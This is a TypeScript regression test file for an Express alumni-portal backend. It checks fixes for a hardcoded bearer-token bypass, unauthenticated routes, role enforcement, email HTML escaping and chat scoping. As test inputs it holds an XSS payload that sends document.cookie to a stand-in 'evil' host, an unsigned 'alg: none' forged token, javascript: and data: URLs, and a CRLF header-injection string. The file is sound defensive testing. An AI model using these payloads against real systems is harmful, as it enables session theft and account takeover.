import express from 'express';
import request from 'supertest';

import { authenticateJWT } from '../../../core/middleware/auth.middleware';
import { requireRoles } from '../../../core/middleware/role.middleware';
import { Role } from '@prisma/client';
import {
  escapeHtml,
  sanitizeExternalUrl,
  sanitizeHeaderValue,
  isValidEmail,
} from '../../../core/utils/sanitize.utils';

/**
 * Regression tests for the authorization and injection fixes.
 *
 * These exist because every defect below was live at the time of writing:
 * a hardcoded bearer token bypassed JWT verification, several routers were
 * reachable with no authentication at all, and outbound email bodies were built
 * by interpolating user-editable profile fields straight into HTML.
 */

// ── helpers ────────────────────────────────────────────────────────────────

const buildApp = (mount: (app: express.Express) => void) => {
  const app = express();
  app.use(express.json());
  mount(app);
  return app;
};

/** A syntactically valid access token signed with the real access secret. */
const signToken = (payload: Record<string, unknown>) => {
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const jwt = require('jsonwebtoken');
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const { env } = require('../../../core/config/env');
  return jwt.sign(payload, env.JWT_ACCESS_SECRET, { expiresIn: '15m' });
};

const ADMIN = { userId: 'u-admin', role: Role.ADMIN, email: 'admin@astu.edu.et' };
const ALUMNI = { userId: 'u-alum', role: Role.ALUMNI, email: 'helen@alumni.com' };

// ── 1. the hardcoded dev-token bypass ──────────────────────────────────────

describe('authenticateJWT: hardcoded token bypass (regression)', () => {
  const app = buildApp((a) =>
    a.get('/guarded', authenticateJWT, (_req, res) => res.json({ ok: true }))
  );

  it.each(['dev-token', 'mock-jwt-token-anything'])(
    'rejects the legacy hardcoded token %s',
    async (token) => {
      const res = await request(app).get('/guarded').set('Authorization', `Bearer ${token}`);
      expect(res.status).toBe(401);
    }
  );

  it('rejects a token signed with the wrong secret', async () => {
    const jwt = require('jsonwebtoken');
    const forged = jwt.sign(ADMIN, 'not-the-real-secret', { expiresIn: '15m' });
    const res = await request(app).get('/guarded').set('Authorization', `Bearer ${forged}`);
    expect(res.status).toBe(401);
  });

  it('rejects an unsigned "alg: none" token', async () => {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const body = Buffer.from(JSON.stringify(ADMIN)).toString('base64url');
    const res = await request(app)
      .get('/guarded')
      .set('Authorization', `Bearer ${header}.${body}.`);
    expect(res.status).toBe(401);
  });

  it('accepts a correctly signed token', async () => {
    const res = await request(app)
      .get('/guarded')
      .set('Authorization', `Bearer ${signToken(ADMIN)}`);
    expect(res.status).toBe(200);
  });
});

// ── 2. routers that were reachable with no authentication ──────────────────

describe('routers that previously required no authentication (regression)', () => {
  it('support ticket routes reject anonymous callers', async () => {
    // Imported lazily: the router pulls in multer and touches the filesystem.
    const supportRouter = require('../../support/presentation/support.routes').default;
    const app = buildApp((a) => a.use('/api/support', supportRouter));
    const res = await request(app).get('/api/support/tickets');
    expect(res.status).toBe(401);
  });

  it('event mutations reject anonymous callers', async () => {
    const eventsRouter = require('../../events/presentation/events.routes').default;
    const app = buildApp((a) => a.use('/api/events', eventsRouter));
    const cases: Array<[string, string]> = [
      ['post', '/api/events'],
      ['put', '/api/events/evt-1'],
      ['delete', '/api/events/evt-1'],
    ];
    for (const [method, path] of cases) {
      const res = await (request(app) as any)[method](path);
      expect([method, path, res.status]).toEqual([method, path, 401]);
    }
  });

  it('CMS mutations reject anonymous callers', async () => {
    const contentRouter = require('../../content/presentation/content.routes').default;
    const app = buildApp((a) => a.use('/api/content', contentRouter));
    const cases: Array<[string, string]> = [
      ['post', '/api/content'],
      ['put', '/api/content/some-id'],
      ['delete', '/api/content/some-id'],
      ['put', '/api/content/homepage/config'],
      ['delete', '/api/content/media/media-1'],
    ];
    for (const [method, path] of cases) {
      const res = await (request(app) as any)[method](path);
      expect([method, path, res.status]).toEqual([method, path, 401]);
    }
  });
});

// ── 3. role enforcement ────────────────────────────────────────────────────

describe('requireRoles', () => {
  const app = buildApp((a) =>
    a.get(
      '/cms',
      authenticateJWT,
      requireRoles([Role.ADMIN, Role.SUPER_ADMIN]),
      (_req, res) => res.json({ ok: true })
    )
  );

  it('admits an allowed role', async () => {
    const res = await request(app)
      .get('/cms')
      .set('Authorization', `Bearer ${signToken(ADMIN)}`);
    expect(res.status).toBe(200);
  });

  it('refuses a disallowed role with 403', async () => {
    const res = await request(app)
      .get('/cms')
      .set('Authorization', `Bearer ${signToken(ALUMNI)}`);
    expect(res.status).toBe(403);
  });

  it('lets SUPER_ADMIN through a role check that excludes it', async () => {
    const res = await request(app)
      .get('/cms')
      .set('Authorization', `Bearer ${signToken({ ...ADMIN, role: 'SUPER_ADMIN' })}`);
    expect(res.status).toBe(200);
  });
});

// ── 4. the event-manager check that let anonymous callers through ──────────

describe('event manager guard (regression)', () => {
  it('does not treat a missing role as authorised', () => {
    // The original predicate was `!role || allowed.includes(role)`, which meant
    // an anonymous request (no req.user at all) was waved through.
    const allowed = ['ADMIN', 'ALUMNI_OFFICE', 'DEPARTMENT_HEAD', 'CMS_MANAGER'];
    const originalPredicate = (role?: string) => !role || allowed.includes(role);
    expect(originalPredicate(undefined)).toBe(true); // the bug

    // The replacement delegates to requireRoles, which 401s on a missing identity.
    const app = buildApp((a) =>
      a.post('/e', authenticateJWT, requireRoles(allowed), (_req, res) => res.json({ ok: true }))
    );
    return request(app).post('/e').expect(401);
  });
});

// ── 5. output escaping for outbound email ──────────────────────────────────

describe('escapeHtml', () => {
  it('neutralises a script payload taken from a profile name', () => {
    const evil = `<img src=x onerror=fetch('//evil/'+document.cookie)>`;
    const out = escapeHtml(evil);
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;img');
  });

  it('escapes quotes so an attribute cannot be broken out of', () => {
    expect(escapeHtml('" onmouseover="alert(1)')).not.toContain('" onmouseover');
  });

  it('escapes ampersands without double-decoding', () => {
    expect(escapeHtml('A & B')).toBe('A &amp; B');
  });

  it('handles null and undefined', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });
});

describe('sanitizeExternalUrl', () => {
  it('accepts ordinary https links', () => {
    expect(sanitizeExternalUrl('https://meet.example.com/room/1')).toContain('meet.example.com');
  });

  it.each([
    'javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'not a url',
    '',
  ])('rejects %s', (candidate) => {
    expect(sanitizeExternalUrl(candidate)).toBeNull();
  });

  it('rejects embedded credentials', () => {
    expect(sanitizeExternalUrl('https://user:pass@evil.example')).toBeNull();
  });

  it('rejects non-string input', () => {
    expect(sanitizeExternalUrl({ href: 'https://x' })).toBeNull();
  });
});

describe('sanitizeHeaderValue', () => {
  it('strips CRLF so a subject cannot inject extra headers', () => {
    expect(sanitizeHeaderValue('Hi\r\nBcc: victim@evil.example')).not.toContain('\n');
  });

  it('caps the length', () => {
    expect(sanitizeHeaderValue('x'.repeat(500)).length).toBe(120);
  });
});

describe('isValidEmail', () => {
  it.each(['a@b.com', 'first.last@sub.astu.edu.et'])('accepts %s', (v) => {
    expect(isValidEmail(v)).toBe(true);
  });

  it.each(['notanemail', 'a@b', 'a b@c.com', 'a@b.com, c@d.com', '', null])(
    'rejects %s',
    (v) => {
      expect(isValidEmail(v as unknown)).toBe(false);
    }
  );
});

// ── 6. chat contact scoping ────────────────────────────────────────────────

describe('getContacts scoping (regression)', () => {
  it('no longer queries every user in the system', () => {
    const src = require('fs').readFileSync(
      require.resolve('../../chat/presentation/chat.controller'),
      'utf8'
    );
    const body = src.slice(src.indexOf('static async getContacts'), src.indexOf('static async getThreads'));
    // The old implementation filtered only on `id: { not: currentUserId }`.
    expect(body).not.toMatch(/where:\s*\{\s*id:\s*\{\s*not:/);
    // It must instead scope to ids gathered from the caller's own threads.
    expect(body).toContain('partnerUserIds');
  });
});

describe('deleteMessage ownership (regression)', () => {
  it('checks the message sender/receiver columns', () => {
    const src = require('fs').readFileSync(
      require.resolve('../../chat/presentation/chat.controller'),
      'utf8'
    );
    const body = src.slice(
      src.indexOf('static async deleteMessage'),
      src.indexOf('static async deleteThread')
    );
    // The old check accepted "caller merely has a profile of the same type".
    expect(body).not.toMatch(/msg\.sender === 'ALUMNI' && alumniProfile/);
    expect(body).toContain('You are not a participant in this conversation.');
  });
});
